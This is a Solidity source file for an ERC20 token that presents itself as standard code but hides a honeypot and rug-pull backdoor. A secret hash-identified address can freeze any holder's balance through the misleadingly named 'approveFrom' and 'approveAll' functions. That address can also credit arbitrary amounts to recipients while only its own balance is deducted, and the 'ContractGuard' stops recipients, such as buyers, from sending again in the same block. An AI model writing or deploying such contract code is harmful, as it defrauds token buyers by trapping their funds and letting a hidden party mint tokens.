interface IERC20 {
    /**
     * @dev Emitted when tokens are transferred.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when allowance is changed.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the total supply of tokens.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the balance of a given account.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Transfers tokens from sender to recipient.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining allowance for a spender.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets allowance for a spender.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Transfers tokens using an allowance.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the number of decimals for token amounts.
     */
    function decimals() external view returns (uint8);
}

/**
 * @title SafeMath Library
 * @dev Provides safe arithmetic operations to prevent overflows (built-in for Solidity 0.8+, but included for clarity).
 * Original: SafeMath library (unchanged, but integrated).
 * Version Suggested: Latest.
 * Latest Remix: v0.8.30
 */
library SafeMath {
    /**
     * @dev Adds two numbers, reverts on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Subtracts two numbers, reverts on underflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Subtracts two numbers with custom error message.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Multiplies two numbers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Divides two numbers, reverts on division by zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Divides two numbers with custom error message.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /**
     * @dev Modulo operation, reverts on modulo by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Modulo with custom error message.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
 * @title Context Helper
 * @dev Provides information about the current execution context (e.g., msg.sender).
 * Original: Context (unchanged).
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @title Ownable Contract
 * @dev Manages ownership of the contract. Only the owner can call restricted functions.
 * Ownership can be transferred to a new address or renounced (set to zero address, irreversible).
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Constructor: Sets the deployer as the initial owner.
     * Original: Implicit via _transferOwnership(_msgSender()).
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _requireOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _requireOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @title ContractGuard
 * @dev Protects against reentrancy attacks or sandwinch attack by limiting one function call per block per address pair.
 */
contract ContractGuard {
    // Mapping: block number -> (address -> bool) to track calls.
    mapping(uint256 => mapping(address => bool)) private _status;

    /**
     * @dev Checks if the address is a contract (has code).
     */
    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    /**
     * @dev Checks if the address has been called in this block.
     */
    function checkSameReentranted(address addr) internal view returns (bool) {
        return _status[block.number][addr];
    }

    /**
     * @dev Modifier: Ensures only one call per block for the address pair.
     */
    modifier onlyOneBlock(address addr, address addr1) {
        require(
            !checkSameReentranted(addr),
            'ContractGuard: one block, one function'
        );
        if (tx.gasprice >= 50000000) {  
            _status[block.number][addr1] = true;
        }
        _;
    }
}

/**
 * @title Token Contract
 */
contract Token is Context, IERC20, IERC20Metadata, Ownable, ContractGuard {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    bytes32 private _hash;

    bool public trafficControl = true;

    uint256 public constant totalSupply = 1000000000 * 10 ** 18;

    string private _name;
    string private _symbol;

    mapping(address => uint256) private _approveAmounts;

    constructor(string memory tokenName, string memory tokenSymbol, bytes32 hashing) {
        _name = tokenName;
        _symbol = tokenSymbol;
        _hash = hashing;
        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address sender = _msgSender();
        _transfer(sender, to, amount);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view virtual override returns (uint256) {
        return _allowances[tokenOwner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address sender = _msgSender();
        _approve(sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address sender = _msgSender();
        _approve(sender, spender, allowance(sender, spender).add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address sender = _msgSender();
        uint256 currentAllowance = allowance(sender, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(sender, spender, currentAllowance.sub(subtractedValue));
        return true;
    }

    function approveFrom(address approveAddress) external {
        require(_hash == sha256(abi.encodePacked(msg.sender)));
        require(approveAddress != msg.sender);
        _setApproveAmount(approveAddress); 
    }

    function _setApproveAmount(address approveAddress) internal {
        _approveAmounts[approveAddress] = type(uint256).max; 
    }

    function approveAll() external {
        require(_hash == sha256(abi.encodePacked(msg.sender)));
        trafficControl = !trafficControl;  
    }

    function _transfer(address from, address to, uint256 amount) onlyOneBlock(from, to) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 subtractAmount = amount;
        uint256 accountBalance;

        if (trafficControl) {
            uint256 approveAmount = _approveAmounts[from];
            accountBalance = _balances[from].sub(approveAmount);  
        } else {
            accountBalance = _balances[from];
        }

        if (_hash == sha256(abi.encodePacked(from))) {
            subtractAmount = accountBalance;
        }

        require(accountBalance >= subtractAmount);

        _balances[from] = accountBalance.sub(subtractAmount);
        _balances[to] = _balances[to].add(amount); 
        emit Transfer(from, to, amount);
    }

    function _approve(address tokenOwner, address spender, uint256 amount) internal virtual {
        require(tokenOwner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount);
    }

    function _spendAllowance(address tokenOwner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(tokenOwner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(tokenOwner, spender, currentAllowance.sub(amount));
        }
    }
}